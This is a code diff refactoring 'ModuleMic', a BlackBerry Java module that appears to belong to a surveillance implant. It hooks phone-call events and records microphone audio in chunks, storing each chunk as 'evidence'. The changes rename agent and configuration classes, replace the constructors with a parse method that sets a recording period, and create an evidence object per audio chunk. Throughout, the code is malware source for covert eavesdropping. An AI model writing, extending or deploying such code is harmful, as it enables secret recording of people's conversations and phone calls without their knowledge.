@@ -12,9 +12,9 @@ package blackberry.module;
 import net.rim.blackberry.api.phone.Phone;
 import net.rim.blackberry.api.phone.PhoneListener;
 import net.rim.device.api.util.DataBuffer;
-import blackberry.AgentManager;
+import blackberry.ModuleManager;
 import blackberry.Status;
-import blackberry.config.Conf;
+import blackberry.config.ConfModule;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
 import blackberry.evidence.Evidence;
@@ -52,34 +52,14 @@ public final class ModuleMic extends BaseModule implements PhoneListener {
     private AudioRecorder recorder;
     int numFailures;
 
-    /**
-     * Instantiates a new mic agent.
-     * 
-     * @param agentStatus
-     *            the agent status
-     */
-    public ModuleMic(final boolean agentEnabled) {
-        super(BaseModule.AGENT_MIC, agentEnabled, Conf.AGENT_MIC_ON_SD, "MicAgent");
-        //#ifdef DBC
-        Check.asserts(
-                Evidence.convertTypeEvidence(agentId) == EvidenceType.MIC,
-                "Wrong Conversion");
-        //#endif
-    }
-
-    /**
-     * Instantiates a new mic agent.
-     * 
-     * @param agentStatus
-     *            the agent status
-     * @param confParams
-     *            the conf params
-     */
-    protected ModuleMic(final boolean agentStatus, final byte[] confParams) {
-        this(agentStatus);
-        parse(confParams);
+    
+    public boolean parse(ConfModule conf) {
+        setPeriod(MIC_PERIOD);
+        setDelay(MIC_PERIOD);
         state = STOPPED;
+        return true;
     }
+    
 
     private void newState(int newstate) {
         synchronized (stateLock) {
@@ -238,9 +218,10 @@ public final class ModuleMic extends BaseModule implements PhoneListener {
         //#endif
 
         final byte[] chunk = recorder.getAvailable();
-
+        
         if (chunk != null && chunk.length > 0) {
 
+            Evidence evidence=new Evidence(EvidenceType.MIC);
             //#ifdef DBC
             Check.requires(evidence != null, "Null log");
             //#endif
@@ -371,7 +352,7 @@ public final class ModuleMic extends BaseModule implements PhoneListener {
     }
 
     public static ModuleMic getInstance() {
-        return (ModuleMic) AgentManager.getInstance().getItem(AGENT_MIC);
+        return (ModuleMic) ModuleManager.getInstance().get("mic");
     }
 
     public void callAdded(int callId) {
